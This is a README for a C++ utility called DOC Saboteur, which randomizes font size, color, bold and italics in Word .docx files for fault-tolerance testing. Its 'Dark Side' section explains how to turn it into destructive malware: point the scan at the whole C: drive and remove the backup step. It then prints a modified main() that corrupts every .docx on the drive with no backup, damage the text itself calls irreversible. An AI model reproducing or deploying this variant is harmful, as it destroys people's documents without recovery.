# DOC Saboteur

## Introduction

DOC Saboteur is a fun and practical tool specifically designed for randomizing the formatting properties of Word documents (*.docx), including font size, font color, bolding, and italicizing. This tool is perfect for developers who need to test the fault tolerance of document processing software to various formats, or for any user interested in randomizing Word document formats.

## Features

- **Format Property Randomization**: Automatically scans all Word documents (*.docx) in the program root directory (or specified directory) and randomizes the text formatting of each file.
- **File Processing**:
  - **Non-support for Chinese filenames**: The program will automatically detect Chinese filenames and rename them to non-Chinese strings to ensure error-free processing.
  - **Automatic Backup**: Before any modifications, automatically backs up the original file to the `doc_saboteur_backup` directory on the C drive to ensure data safety.

## User Guide

1. Place Word documents (*.docx) in the program root directory (default configuration).
2. Run the DOC Saboteur program.
3. The program will automatically scan all Word documents in the root directory and process them with format randomization.
4. After processing, you can find the modified documents in the program root directory.
5. Original files will be safely backed up to the `doc_saboteur_backup` directory on the C drive.

## Precautions

1. Ensure that the `doc_saboteur_backup` directory on the C drive exists and has enough space to store backup files.
2. The program currently does not support directly processing documents with Chinese filenames but will automatically rename them.
3. When using this program, ensure you have sufficient permissions to access and modify files in the specified directory.

## Code Compilation Environment
**System Environment**: `Windows10-x64`; `Visual Studio 2022`; `C++17`;

**Required Libraries**: `Pugixml`; `libzip`; `zlib`;

## Dark Side
You only need to modify two lines of code in the `main()` function to turn it into a very malicious program.
1. Modify the code `std::vector<std::string> file_list = op.find_docx_files("./");`, where `"./"` represents the program's root directory. You can change it to a disk drive, such as `C:/`, so the program will traverse and corrupt all `*.docx` files under the C drive.
2. Comment out `if (op.copy_file(*iter, "C:/doc_saboteur_backup/" + *iter) == true)`, this line of code is used to back up the document to `C:/doc_saboteur_backup/` before corrupting it. If commented out, the program will not back up the document, making the damage to your documents irreversible!!!

#### Below is an example:

```c++
int main() {
    std::cout << "DOC Saboteur - v0.1;\nPowered by RMSHE - 2024.03.15;\n" << std::endl;

    try {
        std::vector<std::string> file_list = op.find_docx_files("C:/");
        for (auto iter = file_list.begin(); iter != file_list.end(); ++iter) {
                std::filesystem::path _docxPath_ = op.renameIfChinese(*iter);

                // Convert to std::string
                std::string docxPathString = _docxPath_.string();

                // Get const char* type
                const char *docxPath = docxPathString.c_str();
                const char *docXmlPath = "word/document.xml";

                std::cout << docxPath << std::endl;

                std::string xmlContent = op.readZipFile(docxPath, docXmlPath);

                // Randomization processing
                std::string modifiedXml = randomizeFontPropertiesEnhanced(xmlContent);
                op.writeZipFile(docxPath, docXmlPath, modifiedXml);

                std::cout << "Document processed: " + *iter << std::endl;
            }
    } catch (const std::exception &e) {
        std::cerr << "An error occurred: " << e.what() << std::endl;

        system("pause");
        return 1;
    }

    system("pause");
    return 0;
}
```